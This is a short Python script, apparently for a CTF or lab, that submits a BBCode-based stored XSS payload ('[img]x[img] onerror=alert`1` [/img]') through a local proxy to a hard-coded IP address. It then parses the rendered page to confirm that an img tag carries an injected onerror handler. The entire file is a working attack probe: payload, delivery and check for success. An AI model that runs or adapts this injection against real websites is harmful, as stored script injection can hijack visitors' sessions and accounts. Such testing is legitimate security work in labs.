import time, urllib.request, urllib.parse
from html.parser import HTMLParser
BASE = "http://160.202.254.160:15880/"
PROXY = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
op = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))

def get(data=None):
    d = urllib.parse.urlencode(data).encode() if data is not None else None
    with op.open(BASE, data=d, timeout=20) as r:
        return r.read().decode("gb18030", "replace")

MARK = "PX1"
PAYLOAD = "[img]x[img] onerror=alert`1` [/img]"
content = PAYLOAD + " " + MARK
get({"content": content})
time.sleep(0.3)
body = get()
i = body.find(MARK)
start = body.rfind("<pre>", 0, i)
seg = body[start:i+len(MARK)]
print("PAYLOAD :", PAYLOAD)
print("RENDERED:", repr(seg))

class P(HTMLParser):
    def __init__(self):
        super().__init__(); self.tags=[]
    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, attrs))
    def handle_startendtag(self, tag, attrs):
        self.tags.append((tag, attrs))

p = P(); p.feed(seg)
print("\n解析出的标签:")
for tag, attrs in p.tags:
    print("  <%s> %s" % (tag, attrs))
    if tag == "img":
        names = [a for a, _ in attrs]
        print("    onerror 存在:", "onerror" in names)
